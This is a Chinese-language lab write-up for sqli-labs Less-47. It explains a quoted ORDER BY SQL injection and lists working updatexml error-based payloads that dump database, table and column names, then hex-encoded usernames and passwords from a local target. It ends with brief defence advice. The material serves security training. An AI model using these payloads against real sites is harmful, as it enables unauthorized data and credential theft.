## 题目: Sqli‑labs Less‑47

## 题目描述
GET传入sort排序参数，sort被单引号包裹，字符型ORDER BY注入；页面开启SQL报错回显。ORDER BY位置UNION无法正常输出，布尔条件判断失效，使用updatexml XPATH报错注入获取数据；报错存在31字符截断限制。

## 核心原理
```php
$id = $_GET['sort'];
$sql = "SELECT * FROM users ORDER BY '$id'";
```
关键点：sort 被单引号包裹，payload 需要`'`闭合，`-- -`注释尾部；ORDER BY 位置 UNION 无效、布尔判断失效；updatexml 构造非法 XPATH 带出数据；存在 31 字符截断，数据含单引号特殊字符，优先使用`hex()`编码分段读取，`0x7e`即`~`作为数据标记。

**解题思路**
1. Burp 抓包修改 sort 参数，单引号测试确认闭合；
2. updatexml 报错依次爆出库、表、字段；
3. 使用 hex 编码分段读取，解决字符截断与特殊字符干扰；

## 解题步骤

### 1. 测试单引号闭合 Burp 包
```
GET /sqli-labs/Less-47/?sort=1' HTTP/1.1
Host: 127.0.0.1
```
页面返回 SQL 语法错误，确认单引号注入点。

### 2. 报错注入爆库名 Burp 包
```
GET /sqli-labs/Less-47/?sort=1' and updatexml(1,concat(0x7e,database()),1) -- - HTTP/1.1
Host: 127.0.0.1
```
页面报错：`XPATH syntax error: '~security'`

### 3. 爆表名 Burp 包
```
GET /sqli-labs/Less-47/?sort=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- - HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~emails,referers,uagents,users`

### 4. 爆字段名 Burp 包
```
GET /sqli-labs/Less-47/?sort=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)),1) -- - HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~id,username,password`

### 5. hex 编码读取 users 数据 Burp 包（解决截断与特殊字符）
```
GET /sqli-labs/Less-47/?sort=1' and updatexml(1,concat(0x7e,substr(hex((select group_concat(username,0x3a,password) from users)),1,30)),1) -- - HTTP/1.1
Host: 127.0.0.1
```
> 
> 修改 substr 偏移参数，分段获取全部 hex 字符串，解码得到明文账号密码。

## 踩坑记录
1. 和 Less‑46 区分：46 为数字型，47 是字符型，必须添加`'`做闭合，结尾`-- -`注释。
2. ORDER BY 子句下 UNION 查询无法输出数据，不要使用联合注入。
3. XPATH 报错最多输出 31 字符，直接查询会截断；数据内含有带单引号用户名，`hex()`编码兼容性最好。
4. `and 1=1`/`and 1=2`无法产生页面差异，布尔盲注不适用。
5. `0x7e(~)`标记符，方便从报错信息中定位目标数据。

## 知识点总结
- 字符型 ORDER BY 注入：`ORDER BY '$id'`，payload 以单引号闭合。
- updatexml 报错注入：构造非法 XPATH，借助报错回显提取数据。
- 截断与特殊字符处理：采用 hex 十六进制编码分段读取。
- ORDER BY 注入特性：UNION、布尔判断失效，优先报错注入或时间盲注。
- 防御：sort 参数配置列名白名单；禁止直接拼接用户输入；关闭生产环境 SQL 报错。
